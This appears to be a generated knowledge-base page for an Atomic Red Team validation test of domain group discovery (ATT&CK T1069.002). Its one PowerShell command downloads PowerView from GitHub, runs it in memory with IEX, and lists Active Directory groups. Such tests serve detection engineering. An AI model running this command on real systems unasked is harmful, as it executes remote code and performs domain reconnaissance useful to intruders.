---
atomic_guid: "5a8a181c-2c8e-478d-a943-549305a01230"
title: "Get-DomainGroup with PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1069.002"
attack_technique_name: "Permission Groups Discovery: Domain Groups"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "5a8a181c-2c8e-478d-a943-549305a01230"
  - "Get-DomainGroup with PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.

## ATT&CK Mapping

- [[kb/attack/techniques/T1069-permission_groups_discovery#^t1069002-domain-groups|T1069.002: Domain Groups]]

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.yaml)
